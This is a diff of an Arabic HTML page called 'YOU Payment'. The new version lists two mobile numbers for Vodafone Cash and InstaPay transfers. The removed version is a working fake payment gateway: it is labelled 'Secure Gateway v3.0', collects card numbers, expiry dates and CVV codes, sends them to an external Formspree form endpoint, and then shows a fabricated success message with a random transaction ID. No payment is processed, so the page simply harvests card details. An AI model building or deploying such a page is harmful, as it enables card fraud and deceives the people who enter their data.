@@ -1,187 +1,32 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YOU Payment - المحرك الذكي</title>
+    <title>YOU-Payment</title>
     <style>
-        /* تصميم القائد التقني - تباين عالٍ وحماية فائقة */
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            font-family: 'Arial', sans-serif;
-            font-size: 22px; /* الحجم المثالي للوضوح */
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .main-container {
-            width: 90%;
-            max-width: 450px;
-            padding: 35px;
-            border: 2px solid #ccff00; /* الإطار الأصفر الليموني الملكي */
-            border-radius: 25px;
-            background-color: #050505;
-            box-shadow: 0 0 30px rgba(204, 255, 0, 0.15);
-            text-align: center;
-        }
-
-        .logo {
-            font-size: 55px;
-            font-weight: bold;
-            color: #ccff00;
-            margin-bottom: 5px;
-            letter-spacing: 3px;
-        }
-
-        .status-tag {
-            color: #ccff00;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 30px;
-            opacity: 0.8;
-        }
-
-        label {
-            display: block;
-            text-align: right;
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-
-        input {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 25px;
-            background-color: #111;
-            border: 1px solid #ccff00;
-            border-radius: 12px;
-            color: #ffffff;
-            font-size: 20px;
-            box-sizing: border-box;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        input:focus {
-            border-width: 2px;
-            box-shadow: 0 0 15px rgba(204, 255, 0, 0.3);
-        }
-
-        .pay-btn {
-            width: 100%;
-            padding: 18px;
-            background-color: #ccff00;
-            color: #000000;
-            border: none;
-            border-radius: 15px;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        .pay-btn:hover {
-            background-color: #e6ff80;
-            transform: scale(1.03);
-        }
-
-        #success-area {
-            display: none;
-            margin-top: 20px;
-            padding: 25px;
-            border: 1px dashed #ccff00;
-            border-radius: 20px;
-            background-color: #0a0a0a;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .tr-id {
-            color: #ccff00;
-            font-weight: bold;
-            font-family: 'Courier New', monospace;
-            font-size: 28px;
-            margin-top: 15px;
-            display: block;
-        }
-
-        .footer {
-            font-size: 12px;
-            color: #444;
-            margin-top: 30px;
-        }
+        body { background-color: #000; color: #fff; font-family: sans-serif; padding: 20px; }
+        .container { max-width: 400px; margin: auto; }
+        select, input, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 20px; border-radius: 8px; }
+        button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="main-container">
-        <div class="logo">YOU</div>
-        <div class="status-tag">Secure Gateway v3.0</div>
-        
-        <!-- المحرك مربوط برابط Formspree الخاص بك مباشرة -->
-        <form id="paymentForm" action="https://formspree.io/f/mwvyzgyd" method="POST">
-            <label>رقم البطاقة</label>
-            <input type="text" name="Card_Number" placeholder="0000 0000 0000 0000" required>
-
-            <div style="display: flex; gap: 15px;">
-                <div style="flex: 2;">
-                    <label>تاريخ الانتهاء</label>
-                    <input type="text" name="Expiry_Date" placeholder="MM/YY" required>
-                </div>
-                <div style="flex: 1;">
-                    <label>رمز CVV</label>
-                    <input type="password" name="CVV" placeholder="***" required>
-                </div>
-            </div>
-
-            <!-- حقل مخفي لتوثيق رقم العملية في البريد -->
-            <input type="hidden" name="Transaction_ID" id="hiddenTrID">
-
-            <button type="submit" class="pay-btn" id="btnText">تأكيد العملية الآن</button>
-        </form>
-
-        <div id="success-area">
-            <p style="margin: 0; color: #ffffff; font-size: 20px;">تمت العملية بنجاح ✅</p>
-            <p style="font-size: 14px; color: #888; margin-top: 10px;">احتفظ برقم العملية للتوثيق:</p>
-            <span class="tr-id" id="displayTrID"></span>
-        </div>
-
-        <div class="footer">
-            نظام YOU - تطوير القائد التقني والمساعد © 2026
-        </div>
+    <div class="container">
+        <h2>YOU-Payment</h2>
+        <select id="method">
+            <option value="01014505254">فودافون كاش: 01014505254</option>
+            <option value="01280208018">إنستا باي: 01280208018</option>
+        </select>
+        <input type="number" id="amount" placeholder="المبلغ">
+        <button onclick="pay()">تأكيد العملية</button>
     </div>
-
     <script>
-        const form = document.getElementById('paymentForm');
-        
-        form.onsubmit = function() {
-            // توليد رقم العملية الاحترافي
-            const newID = "YOU-" + Math.floor(1000000 + Math.random() * 9000000);
-            document.getElementById('hiddenTrID').value = newID;
-            document.getElementById('displayTrID').innerText = newID;
-
-            // تغيير شكل الزر لإظهار العمل البرمجي
-            const btn = document.getElementById('btnText');
-            btn.innerHTML = "جاري التأمين والإرسال...";
-            btn.disabled = true;
-            btn.style.cursor = "not-allowed";
-
-            // إظهار واجهة النجاح (سيتم الإرسال في الخلفية)
-            setTimeout(() => {
-                form.style.display = 'none';
-                document.getElementById('success-area').style.display = 'block';
-            }, 1200);
-        };
+        function pay() {
+            const method = document.getElementById('method').value;
+            const amount = document.getElementById('amount').value;
+            alert("يرجى التحويل إلى: " + method + "\nالمبلغ: " + amount + "\nشكراً لاستخدامك YOU-Payment");
+        }
     </script>
 </body>
 </html>
